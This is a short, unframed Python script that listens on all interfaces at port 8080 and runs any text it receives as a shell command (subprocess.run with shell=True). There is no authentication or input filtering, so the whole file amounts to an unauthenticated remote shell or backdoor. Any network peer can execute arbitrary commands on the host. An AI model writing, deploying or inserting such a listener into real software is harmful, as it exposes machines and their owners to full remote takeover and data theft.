import socket
import subprocess

server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

host = '0.0.0.0'
port = 8080
server_socket.bind((host, port))
server_socket.listen(5)
print(f'-- Server listening on {host}:{port} --')

def execute_command(command):
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        output = result.stdout.strip()
        error = result.stderr.strip()

        if error:
            return f"Error: {error}"
        else:
            return output

    except Exception as e:
        return f"Error: {e}"

while True:
    client_socket, addr = server_socket.accept()
    print(f'Connection from {addr}')

    try:
        data = client_socket.recv(1024).decode()
        if data:
            print("== START COMMAND EXEC ==")
            result = execute_command(data)
            print(result)
            print("== END COMMAND EXEC ==")

            client_socket.sendall("0".encode())
            client_socket.close()

    except Exception as e:
        print(f'Error: {e}')
        client_socket.sendall(f"Error: {e}".encode())

    finally:
        client_socket.close()